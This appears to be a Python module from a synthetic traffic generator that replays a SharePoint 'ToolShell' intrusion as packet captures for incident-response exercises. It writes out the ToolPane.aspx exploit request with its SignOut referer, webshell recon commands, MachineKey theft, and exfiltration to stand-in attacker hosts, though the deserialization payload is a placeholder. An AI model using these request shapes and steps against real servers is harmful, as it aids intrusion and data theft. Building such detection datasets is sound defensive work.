"""netgen.sharepoint58644 -- the "SharePoint ToolShell CVE-2026-58644" incident-replay scenario.

A replay of the on-prem Microsoft SharePoint Server deserialization RCE (CVE-2026-58644, CVSS 9.8;
exploited in the wild, CISA KEV 2026-07-16), part of the publicly-tracked "ToolShell" chain: a
crafted request to the ToolPane endpoint drops a webshell (spinstall0.aspx), and the signature move
is MachineKey theft -- steal the farm's ValidationKey/DecryptionKey to forge ``__VIEWSTATE`` for
persistent, unauthenticated RCE.

Modelled as a selectable scenario (``ir-sharepoint-cve58644``, category IR), a SIBLING package to the
other IR replays. A NEW published SharePoint host (EXL-SP1) is injected at runtime, with its natural
backends: its content DB on EXL-SQL1 (TDS 1433) and a domain service account against EXL-DC1. The
chain: the ToolPane.aspx exploit with the tell-tale SignOut referer, the spinstall0.aspx webshell,
MachineKey exfil, then the pivot -- the SharePoint box reaching its content DB and the DC.

RFC 791 / network-observable: real IPv4 datagrams (RFC 1918 estate + RFC 5737 external actors). The
HTTPS legs carry a real key-logged TLS 1.3 handshake with the HTTP as cleartext in the record
(decrypts with the exported keys); the TDS, LDAP and SMB legs are cleartext and decodable.

PIN-SAFE: every host is injected into ``ctx.h`` INSIDE ``build()``; a build that does not select
this scenario is byte-for-byte the baseline.
"""
from netgen import flows as F
from netgen.identity import H, get_current
from netgen import protocols as P
from netgen.core import Host

from netgen.netscaler import phases as NSP
from netgen.netscaler.phases import _https_open, _http_req, _https_msg
from netgen.netscaler import _host
from netgen.netscaler import content
import urllib.parse

rng = NSP.rng

_SP_SUFFIX, _SP_IP = "SP1", "10.10.20.57"            # on-prem SharePoint Server (published)
_SP_MAC = "00:50:56:bb:06:2c"
_EXTERNAL = {
    "attacker": ("node58.toolshell-ops.example", "203.0.113.58", 12),  # offender
    "beacon":   ("cdn.sp-telemetry.example",      "192.0.2.58", 13),    # TCP 8443 beacon sink
    "exfil":    ("updates-sharepoint-cdn.com",    "192.0.2.59", 15),    # HTTPS exfil sink (keys + data)
    # own benign-workforce identities (shared defect #28): see metabase72898's comment.
    "wfA": ("host-a.sp-telemetry.example", "198.51.100.111", 7),
    "wfB": ("host-b.sp-telemetry.example", "198.51.100.112", 7),
    "wfC": ("host-c.sp-telemetry.example", "198.51.100.113", 7),
    "wfD": ("host-d.sp-telemetry.example", "198.51.100.114", 7),
}
_UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
       "Chrome/125.0.0.0 Safari/537.36")
_TOOLPANE = "/_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=/ToolPane.aspx"
_SIGNOUT_REFERER = "https://%s/_layouts/SignOut.aspx"       # the ToolShell tell
_WEBSHELL = "/_layouts/15/spinstall0.aspx"
_WS_CMDS = {
    "whoami": (28,), "hostname": (22,), "ipconfig /all": (1120,),
    "net group \"Domain Admins\" /domain": (480, 640), "type web.config": (3200,),
}
_WEBSHELL_LOG = [
    (41, "whoami"), (128, "hostname"), (263, "ipconfig /all"),
    (512, "net group \"Domain Admins\" /domain"), (980, "type web.config"),
    (1540, "whoami"), (1990, "net group \"Domain Admins\" /domain"),
]


def _inject_hosts(ctx):
    """Add the published SharePoint host and the external actors. Pin-safe: runs in the builder."""
    domain = P.DOMAIN
    sp_name = _host(ctx, _SP_SUFFIX)
    if sp_name not in ctx.h:
        ctx.h[sp_name] = Host(sp_name, ctx.link.place(_SP_IP), _SP_MAC, "https",
                              "Microsoft SharePoint Server (published)", ctx.link.server_net,
                              "sharepoint." + domain)
    cache = ctx.__dict__.setdefault("_sp_ext", {})
    for key, (fqdn, ip, hops) in _EXTERNAL.items():
        if key not in cache:
            h = Host(fqdn.split(".")[0].upper(), ip,
                     "02:00:5e:%02x:%02x:%02x" % (rng.randrange(256), rng.randrange(256), rng.randrange(256)),
                     "linux", "external", ip.rsplit(".", 1)[0] + ".0/24", fqdn)
            h.hops = hops
            cache[key] = h
    return cache


# A registered Web Part control-tag payload (ToolShell's deserialization gadget surface), percent-
# encoded as a real application/x-www-form-urlencoded body would be. Padded/trimmed to land the
# total body at exactly 2,653 bytes (the page's own number).
_DWP_MARKUP = (
    "<?xml version=\"1.0\" encoding=\"utf-8\"?><webParts><webPart "
    "xmlns=\"http://schemas.microsoft.com/WebPart/v3\"><metaData><type "
    "name=\"Microsoft.SharePoint.WebPartPages.ToolPane, Microsoft.SharePoint, "
    "Version=15.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c\" /><importErrorMessage>"
    "Cannot import this Web Part.</importErrorMessage></metaData><data><properties>"
    "<property name=\"Title\" type=\"string\">ToolPane</property>"
    "<property name=\"ExportMode\" type=\"exportmode\">All</property>"
    "<property name=\"ChromeType\" type=\"chrometype\">None</property>"
    "</properties></data></webPart></webParts>")


def sp_toolshell(ctx, atk, sp, ts=None):
    """Stage 1a -- the ToolShell exploit: a POST to ToolPane.aspx with the tell-tale SignOut referer
    triggers the deserialization and drops the spinstall0.aspx webshell. The body is a real,
    percent-encoded form field carrying registered Web Part markup."""
    host = "%s:443" % sp.ip
    s = _https_open(ctx, atk, sp, ts, "chrome", sni=None, vantage=sp)
    dwp = urllib.parse.quote(_DWP_MARKUP, safe="")
    payload = ("MSOTlPn_Uri=" + urllib.parse.quote(_WEBSHELL, safe="") + "&MSOTlPn_DWP=" + dwp).encode()
    payload = content.fit(payload, 2653, pad=b"A")      # exact body length the page quotes
    req = _http_req("POST", _TOOLPANE, host, _UA, referer=_SIGNOUT_REFERER % sp.ip,
                    extra=["Content-Type: application/x-www-form-urlencoded"], body=payload)
    _https_msg(s, req, P.http_response("200 OK", content.html_page("ToolPane", 186, "toolshell"),
                                       "text/html", s.t, server="Microsoft-IIS/10.0"))
    return F.merged(s._ns_pre, s.close(think=rng.uniform(0.05, 0.3)))


def _machinekey_text(n):
    vk = "".join("%02X" % b for b in (i * 7 % 256 for i in range(64)))
    dk = "".join("%02X" % b for b in (i * 11 % 256 for i in range(32)))
    body = ("<html><body><!-- spinstall0 -->ValidationKey=%s;ValidationAlgorithm=HMACSHA256;"
            "DecryptionKey=%s;DecryptionAlgorithm=AES</body></html>\n" % (vk, dk))
    return content.fit(body, n)


def sp_machinekey(ctx, atk, sp, ts=None):
    """Stage 1b -- the ToolShell signature: GET the planted spinstall0.aspx, which returns the farm's
    stolen MachineKey (ValidationKey / DecryptionKey) in the response body."""
    host = "%s:443" % sp.ip
    s = _https_open(ctx, atk, sp, ts, "chrome", sni=None, vantage=sp)
    req = _http_req("GET", _WEBSHELL, host, _UA)
    _https_msg(s, req, P.http_response("200 OK", _machinekey_text(460), "text/html", s.t, server="Microsoft-IIS/10.0"))
    return F.merged(s._ns_pre, s.close(think=rng.uniform(0.05, 0.3)))


def sp_webshell_cmd(ctx, atk, sp, cmd, ts=None):
    """Stage 1c -- run one command through the webshell via a forged __VIEWSTATE request. The
    command channel stays a model (short base64 __VIEWSTATE, no real signed/validated payload);
    the response is real text matching the command, at the listed size."""
    import base64
    host = "%s:443" % sp.ip
    body_n = rng.choice(_WS_CMDS[cmd])
    vs = base64.b64encode(cmd.encode()).decode()
    s = _https_open(ctx, atk, sp, ts, "chrome", sni=None, vantage=sp)
    req = _http_req("POST", _WEBSHELL, host, _UA,
                    extra=["Content-Type: application/x-www-form-urlencoded"],
                    body=("__VIEWSTATE=" + vs + "&__VIEWSTATEGENERATOR=00000000").encode())
    out = content.linux_cmd_output(cmd, body_n) if cmd in ("whoami",) else None
    if cmd == "hostname":
        out = content.fit(H("SP1") + "\n", body_n)
    elif cmd == "ipconfig /all":
        out = content.fit("Windows IP Configuration\n\nEthernet adapter Ethernet0:\n   IPv4 Address. . : %s\n"
                          % sp.ip, body_n)
    elif cmd.startswith("net group"):
        out = content.fit("Alias name     Domain Admins\nMembers\n-------------------------------------------------------------------------------\n"
                          "Administrator            adm_claypool-mud\n", body_n)
    elif cmd == "type web.config":
        out = content.xml_doc("configuration", body_n)
    if out is None:
        out = content.fit("\n", body_n)
    _https_msg(s, req, P.http_response("200 OK", out, "text/html", s.t, server="Microsoft-IIS/10.0"))
    return F.merged(s._ns_pre, s.close(think=rng.uniform(0.05, 0.3)))


def sp_contentdb(ctx, sp, sql, ts=None):
    """Stage 3 -- the SharePoint box reaches its content DB on EXL-SQL1 over TDS/1433 as the farm
    account and pulls the document catalogue. Cleartext TDS, fully decodable."""
    out = ctx.arp_for(sp, sql, ts, vantage=sp)
    s = ctx.tcp(sp, sql, 1433, ts + 0.001, vantage=sp).handshake()
    s.c2s(P.tds_prelogin(True), think=0.0006)
    s.s2c(P.tds_prelogin(False), think=rng.uniform(0.0005, 0.003))
    s.c2s(P.tds_login7("sp_farm", app="SharePoint", host=H("SP1"), db="WSS_Content"), think=0.001)
    s.s2c(P.tds_login_ack(db="WSS_Content"), think=rng.uniform(0.001, 0.005))
    s.c2s(P.tds_sql_batch("SELECT TOP 2000 Id, DirName, LeafName FROM AllDocs"), think=0.002)
    s.s2c(P.tds_split(0x04, P.tds_result([("Id", "int"), ("DirName", "nvarchar"), ("LeafName", "nvarchar")],
          [(i, "sites/Intranet/Shared Documents", "report-%04d.docx" % i) for i in range(1, 2001)]), s.dport),
          think=rng.uniform(0.02, 0.2))
    return F.merged(out, s.close(by_client=True, think=rng.uniform(0.05, 0.3)))


# the LDAP enum this campaign runs, ending in the SPN scan
_BIND = "svc_sql"      # estate service account the farm would use for directory lookups
_ENUM = [("samAccountName", "administrator"), ("samAccountName", _BIND),
         ("samAccountName", "svc_backup"), ("memberOf", "CN=Domain Admins,OU=Groups," + P.BASE_DN),
         ("__SPN__", "*")]


def build(ctx, eng, tag, win):
    """Schedule the CVE-2026-58644 ToolShell incident: ToolPane exploit -> spinstall0 webshell ->
    MachineKey theft -> forged-__VIEWSTATE commands -> C2 beacon -> pivot (content-DB TDS, LDAP SPN
    scan, SMB) -> key/data exfil. Signature-critical records always emitted; beacon cadence and
    benign volume scale with ctx.scale. Registered as ``ir-sharepoint-cve58644`` (imported lazily)."""
    ext = _inject_hosts(ctx)
    from netgen import incidents as INC
    s = INC.sched_factory(eng, ctx, tag, win)
    lo, hi = win
    scale = max(0.01, min(1.0, getattr(ctx, "scale", 1.0)))

    def at(offset):
        return lo + offset

    sp = ctx.h[_host(ctx, _SP_SUFFIX)]
    dc1 = ctx.h.get(_host(ctx, "DC1"))
    dc2 = ctx.h.get(_host(ctx, "DC2"))
    sql1 = ctx.h.get(_host(ctx, "SQL1"))
    atk, beacon, exfil = ext["attacker"], ext["beacon"], ext["exfil"]

    # ---- Stage 1: ToolShell exploit + webshell (inbound HTTPS, offender -> SharePoint) -----
    s(at(16), sp_toolshell, atk, sp)
    s(at(34), sp_machinekey, atk, sp)
    for off, cmd in _WEBSHELL_LOG:
        s(at(90 + off), sp_webshell_cmd, atk, sp, cmd)

    # ---- Stage 2: outbound C2 (:8443) + first-seen C2 DNS (NXDOMAIN) -----------------------
    if dc1 is not None:
        s(at(860), NSP.c2_dns, sp, dc1, "cdn.sp-telemetry.example")
        s(at(1140), NSP.c2_dns, sp, dc1, "updates-sharepoint-cdn.com")
    t, counter = at(920), 1
    while t < hi:
        s(t, NSP.c2_beacon, sp, beacon, counter)
        counter += 1
        t += rng.uniform(60, 100)

    # ---- Stage 3: pivot -- content DB (TDS) + LDAP SPN scan + SMB to the DC ----------------
    if sql1 is not None:
        s(at(1480), sp_contentdb, sp, sql1)
    if dc1 is not None:
        s(at(1540), NSP.ldaps_routine, sp, dc1)
        s(at(1600), NSP.ldap_enum_run, sp, dc1, _ENUM, [i * 4 for i in range(len(_ENUM))], bind=_BIND)
        s(at(1660), NSP.smb_fail, sp, dc1)
    if dc2 is not None:
        s(at(1662), NSP.smb_fail, sp, dc2)

    # ---- Stage 4: exfil the stolen MachineKey + pulled data (cleartext HTTP PUT) ------------
    body = ("SharePoint farm MachineKey + document export\n" + "\n".join(
        "doc %d | sites/Intranet/Shared Documents/report-%04d.docx" % (i, i) for i in range(1, 300))).encode()
    s(at(1240), NSP.config_exfil, sp, exfil, body, path="/staging/machinekey.bin")
    # Bulk data exfil -- the HIGH-volume stage (tens of MB): the document library pulled out to the
    # exfil sink, distinct in a bytes-to-attacker view from the ~KB key/config PUT and the beacons.
    s(at(1290), NSP.data_exfil, sp, exfil, int(35_000_000 * scale), label="doclib.zip")

    # ---- benign interleave: normal SharePoint portal traffic -------------------------------
    for label in ("A", "B", "C", "D"):
        visits = max(2, int(round(10 * scale)))
        for _ in range(visits):
            client = ext[{"A": "wfA", "B": "wfB", "C": "wfC", "D": "wfD"}[label]]
            s(lo + rng.uniform(0, max(1.0, hi - lo - 60)), NSP.portal_browse, client, sp, label, product="sharepoint")
